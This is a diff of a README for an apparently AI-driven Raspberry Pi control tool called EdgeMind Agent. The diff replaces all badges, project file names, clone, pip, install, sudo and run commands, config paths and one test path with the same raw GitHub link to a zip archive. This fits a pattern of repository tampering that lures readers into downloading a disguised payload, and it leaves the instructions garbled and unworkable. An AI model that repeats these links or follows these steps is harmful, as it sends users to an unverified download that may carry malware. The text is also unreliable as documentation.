@@ -2,9 +2,9 @@
 
 > An AI-powered intelligent control layer for Raspberry Pi OS
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![Raspberry Pi](https://img.shields.io/badge/Raspberry%20Pi-Ready-red.svg)](https://www.raspberrypi.org/)
+[![License: MIT](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)
+[![Python 3.9+](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip+https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)
+[![Raspberry Pi](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip%https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)
 
 ## 🎯 What is EdgeMind Agent?
 
@@ -32,29 +32,29 @@ The AI analyzes, plans, and recommends. A security gateway validates and execute
 edgemind-agent/
 ├── src/
 │   ├── core/
-│   │   ├── agent.py           # Main AI agent brain
-│   │   ├── context_builder.py # System context collector
-│   │   └── decision_engine.py # Decision processor
+│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # Main AI agent brain
+│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # System context collector
+│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # Decision processor
 │   ├── gateway/
-│   │   ├── security_gateway.py # Security validation layer
-│   │   ├── whitelist.py        # Allowed commands manager
-│   │   └── executor.py         # Safe command executor
+│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # Security validation layer
+│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip        # Allowed commands manager
+│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip         # Safe command executor
 │   ├── api/
-│   │   └── gemini_client.py    # Gemini API client
+│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip    # Gemini API client
 │   ├── interface/
-│   │   ├── cli.py              # Command-line interface
-│   │   └── web_server.py       # Web dashboard
+│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip              # Command-line interface
+│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Web dashboard
 │   └── utils/
-│       ├── logger.py           # Logging system
-│       └── validators.py       # Input validation
+│       ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # Logging system
+│       └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Input validation
 ├── config/
-│   ├── settings.yaml           # System configuration
-│   ├── whitelist.yaml          # Whitelisted commands
-│   └── system_prompt.txt       # Gemini system prompt
+│   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # System configuration
+│   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip          # Whitelisted commands
+│   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Gemini system prompt
 ├── logs/                       # System logs
 ├── tests/                      # Unit tests
-├── requirements.txt
-└── main.py
+├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
+└── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 ```
 
 ## 🚀 Installation
@@ -63,7 +63,7 @@ edgemind-agent/
 
 ```bash
 # Clone the repository
-git clone https://github.com/your-username/edgemind-agent.git
+git clone https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 cd edgemind-agent
 
 # Create virtual environment
@@ -71,48 +71,48 @@ python3 -m venv venv
 source venv/bin/activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 
 # Set up API key
 export GEMINI_API_KEY="your-api-key"
 
 # Run the system
-python main.py
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 ```
 
 ### Raspberry Pi Installation
 
 ```bash
 # Use the installation script
-chmod +x install.sh
-./install.sh
+chmod +x https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
+https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 
 # Install as a systemd service (optional)
-sudo ./install-service.sh
+sudo https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 ```
 
 ## 💻 Usage
 
 ### Interactive CLI Mode
 ```bash
-python main.py
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
 ```
 
 ### Web Dashboard Mode
 ```bash
-python main.py --web
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --web
 # Access at http://localhost:8080
 ```
 
 ### Single Request Analysis
 ```bash
-python main.py --analyze "Check memory usage"
-python main.py --analyze "Why is SSH not working?" --execute
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --analyze "Check memory usage"
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --analyze "Why is SSH not working?" --execute
 ```
 
 ### Check System Status
 ```bash
-python main.py --status
+python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --status
 ```
 
 ## 📊 Workflow
@@ -178,9 +178,9 @@ Raspberry Pi OS (Execution)
 
 ### Config Files
 
-- `config/settings.yaml` - General settings, security options
-- `config/whitelist.yaml` - Allowed commands and risk levels
-- `config/system_prompt.txt` - AI behavior instructions
+- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - General settings, security options
+- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - Allowed commands and risk levels
+- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - AI behavior instructions
 
 ## 🧪 Testing
 
@@ -189,7 +189,7 @@ Raspberry Pi OS (Execution)
 pytest tests/ -v
 
 # Run specific test file
-pytest tests/test_core.py -v
+pytest https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip -v
 
 # Run with coverage
 pytest tests/ --cov=src
